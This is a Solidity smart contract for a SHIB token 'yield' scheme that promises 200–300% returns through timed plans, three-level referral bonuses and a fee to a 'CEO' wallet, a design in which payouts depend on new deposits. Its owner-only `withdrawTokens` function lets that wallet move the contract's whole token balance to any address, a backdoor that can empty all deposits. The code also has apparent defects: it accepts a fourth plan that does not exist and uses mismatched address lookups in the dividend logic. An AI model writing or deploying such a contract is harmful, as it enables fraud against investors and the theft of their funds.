pragma solidity 0.5.10;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library SafeERC20 {
    using SafeMath for uint;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

contract SmartyieldsSHIB {
	using SafeMath for uint256;
	using SafeERC20 for IERC20;

	address private tokenAddr = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE; // SHIB
	IERC20 public token;

	uint256[] public REFERRAL_PERCENTS = [50, 40, 30];
	uint256[] public BONUS_PERCENTS = [100, 150, 200, 250, 300];
	uint256 constant public TOTAL_REF = 120;
	uint256 constant public CEO_FEE = 100;
	uint256 constant public HOLD_BONUS = 10;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	

	uint256 public totalInvested;
	uint256 public totalBonus;

	uint256 public INVEST_MIN_AMOUNT = 1524000 ether;
	uint256 public BONUS_MIN_AMOUNT = 1524000 ether;


	bool public bonusStatus = false;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[3] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
	}

	mapping (address => User) internal users;
	mapping (address => mapping(uint256 => uint256)) internal userDepositBonus;

	uint256 public startDate;

	address payable public ceoWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable ceoAddr, uint256 start) public {
		require(!isContract(ceoAddr));
		ceoWallet = ceoAddr;

		token = IERC20(tokenAddr);

		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}

        plans.push(Plan(40,  50));  // 200%
        plans.push(Plan(60,  40));  // 240%
        plans.push(Plan(100, 30));  // 300%
	}

	function invest(address referrer, uint8 plan , uint256 amount) public {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(amount >= INVEST_MIN_AMOUNT,"error min");
        require(plan < 4, "Invalid plan");

		require(amount <= token.allowance(msg.sender, address(this)) ,"Tansaction not approved");
		token.safeTransferFrom(msg.sender, address(this), amount);

		uint256 ceo = amount.mul(CEO_FEE).div(PERCENTS_DIVIDER);
		token.safeTransfer(ceoWallet, ceo);
		emit FeePayed(msg.sender, ceo);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}
			else{
				user.referrer = ceoWallet;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 refAmount = amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(refAmount);
					users[upline].totalBonus = users[upline].totalBonus.add(refAmount);
					emit RefBonus(upline, msg.sender, i, refAmount);
					upline = users[upline].referrer;
				} else break;
			}
		}else{
			uint256 refAmount = amount.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
			token.safeTransfer(ceoWallet, refAmount);
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, amount, block.timestamp));

		totalInvested = totalInvested.add(amount);

		emit NewDeposit(msg.sender, plan, amount, block.timestamp);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = token.balanceOf(address(this));
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
		
		token.safeTransfer(msg.sender, totalAmount);

		emit Withdrawn(msg.sender, totalAmount, block.timestamp);
	}

	function getContractBalance() public view returns (uint256) {
		return token.balanceOf(address(this));
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					
					uint256 holdDays = (to.sub(from)).div(TIME_STEP);
					if(holdDays > 0){
						totalAmount = totalAmount.add(user.deposits[i].amount.mul(HOLD_BONUS.mul(holdDays)).div(PERCENTS_DIVIDER));
					}
				}

				//end of plan
				if(finish <= block.timestamp){
					if(userDepositBonus[msg.sender][i] > 0){
						totalAmount = totalAmount.add(user.deposits[i].amount.mul(userDepositBonus[msg.sender][i]).div(PERCENTS_DIVIDER));
					}
				}


			}
		}

		return totalAmount;
	}

	function getUserHoldBonus(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		if(user.checkpoint > 0){
			uint256 holdBonus = 0;
				if (user.checkpoint < block.timestamp) {
					uint256 holdDays = (block.timestamp.sub(user.checkpoint)).div(TIME_STEP);
					if(holdDays > 0){
						holdBonus = holdDays.mul(HOLD_BONUS);
					}
				}
			return holdBonus;
		}
		else{
			return 0;
		}
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[3] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalRef, uint256 _totalBonus) {
		return(totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER),totalBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	//config
	function setMinMax(uint256 minAmount, uint256 minBonus) external {
		require(msg.sender == ceoWallet, "only owner");
		INVEST_MIN_AMOUNT = minAmount;
		BONUS_MIN_AMOUNT  = minBonus;
	}

	function setBonusStatus(bool status) external {
		require(msg.sender == ceoWallet, "only owner");
		bonusStatus = status;
	}

	function withdrawTokens(address tokenAddr, address to) external {
		require(msg.sender == ceoWallet, "only owner");
		IERC20 alttoken = IERC20(tokenAddr);
		alttoken.transfer(to,alttoken.balanceOf(address(this)));
	}
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
